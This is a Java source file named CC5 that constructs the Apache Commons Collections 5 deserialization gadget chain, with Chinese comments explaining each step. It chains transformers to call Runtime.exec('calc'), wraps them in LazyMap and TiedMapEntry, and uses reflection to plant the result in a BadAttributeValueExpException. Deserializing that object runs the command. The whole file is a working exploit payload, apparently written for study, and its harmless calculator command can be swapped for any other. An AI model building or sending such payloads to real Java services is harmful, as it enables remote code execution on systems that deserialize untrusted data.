package org.example;

import com.sun.javafx.collections.MappingChange;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.AccessibleObject;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CC5 {
    public static Object getobject() throws NoSuchFieldException, IllegalAccessException {
        //readobject()反序列化入口点
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer template = new ChainedTransformer(transformers);
        // template.transformers(1);

        // 调用LazyMap的get方法
        Map map = new HashMap();
        Map lazymap = LazyMap.decorate(map,template);
        //lazymap.get(1);

        //TiedMapEntry的tostring方法
        TiedMapEntry tiedmapentry = new TiedMapEntry(lazymap,1);
        //tiedmapentry.toString();

        //BadAttributeValueExpException的readObject
        //BadAttributeValueExpException object = new BadAttributeValueExpException(tiedmapentry);
        //Object object = lazymap;

        BadAttributeValueExpException object = new BadAttributeValueExpException(null);
        Field valfield = object.getClass().getDeclaredField("val");
        //AccessibleObject Reflections;
        valfield.setAccessible(true);
        valfield.set(object, tiedmapentry);

        return object;
    }
}
